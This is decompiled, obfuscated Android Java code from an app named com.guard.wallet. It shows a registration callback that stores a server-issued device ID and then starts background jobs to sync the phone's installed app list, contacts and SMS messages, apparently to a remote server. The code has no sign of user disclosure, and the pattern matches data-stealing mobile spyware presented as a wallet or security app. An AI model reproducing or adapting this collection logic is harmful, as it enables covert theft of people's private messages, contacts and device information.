package com.guard.wallet.http;

import a1.AbstractC0026q;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.thread.CallableC0244m;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.IOException;
import p0.InterfaceC0863e;
import p0.j0;
import p015s.C0897b;

/* renamed from: com.guard.wallet.http.w */
/* loaded from: classes.dex */
public final class C0218w implements InterfaceC0863e {
    @Override // p0.InterfaceC0863e
    /* renamed from: b */
    public final void mo389b(p0.e0 e0Var, IOException iOException) {
        AbstractC0026q.m186s("RegisterCallback", iOException);
        if (iOException instanceof C0897b) {
            return;
        }
        C0204i.m400c(e0Var.f1773c.f1777a.f1914h);
        AbstractC0207l.m441x(e0Var, this);
    }

    @Override // p0.InterfaceC0863e
    /* renamed from: d */
    public final void mo390d(p0.e0 e0Var, j0 j0Var) {
        boolean m701e;
        boolean m701e2;
        boolean m701e3;
        C0204i.m400c(e0Var.f1773c.f1777a.f1914h);
        if (j0Var.f1835g != null) {
            try {
                ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(j0Var.f1835g.m1269z(), new TypeToken<ApiResult<String>>() { // from class: com.guard.wallet.http.RegisterCallback$1
                });
                if (apiResult != null && apiResult.getSuccess().booleanValue() && !AbstractC0026q.m151B(apiResult.getData())) {
                    AbstractC0252h.m683D((String) apiResult.getData(), "deviceId");
                    AbstractC0207l.m418a();
                    if (!AbstractC0026q.m189v(AbstractC0251g.i0())) {
                        AbstractC0207l.m438u();
                    }
                    AbstractC0207l.m421d();
                    if (AbstractC0251g.m665l()) {
                        synchronized (AbstractC0252h.class) {
                            m701e3 = AbstractC0252h.m701e("syncPackages");
                        }
                        if (!m701e3) {
                            AbstractC0243l.m594d(new CallableC0244m(2), "SYNC_DEVICE_INSTALLED_PACKAGES");
                        }
                    }
                    if (AbstractC0251g.m667n()) {
                        synchronized (AbstractC0252h.class) {
                            m701e2 = AbstractC0252h.m701e("syncContacts");
                        }
                        if (!m701e2) {
                            AbstractC0243l.m594d(new CallableC0244m(1), "SYNC_DEVICE_CONTACTS");
                        }
                    }
                    if (AbstractC0251g.m669p()) {
                        synchronized (AbstractC0252h.class) {
                            m701e = AbstractC0252h.m701e("syncSmsMessage");
                        }
                        if (!m701e) {
                            AbstractC0243l.m594d(new CallableC0244m(3), "SYNC_DEVICE_SMS");
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("RegisterCallback", e2);
            }
        }
        j0Var.close();
    }
}
